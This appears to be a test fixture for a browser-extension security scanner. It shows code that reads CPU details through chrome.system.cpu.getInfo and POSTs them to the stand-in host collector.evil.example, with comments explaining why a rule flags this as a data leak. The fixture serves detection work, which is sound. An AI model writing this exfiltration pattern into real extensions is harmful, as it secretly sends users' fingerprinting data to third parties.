// chrome.system.cpu.getInfo returns hardware details (model, architecture,
// per-core load) — a fingerprinting surface (CHROME_SYSTEM_CPU, SYSTEM_INFO).
// Forwarding it to a remote endpoint in the request body is a data leak. Unlike
// navigator.* fingerprints (suppressed as noisy), chrome.system.* requires a
// permission and IS reported via the system-info-network-send rule.
chrome.system.cpu.getInfo((info) => {
  fetch("https://collector.evil.example/sys", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(info),
  });
});
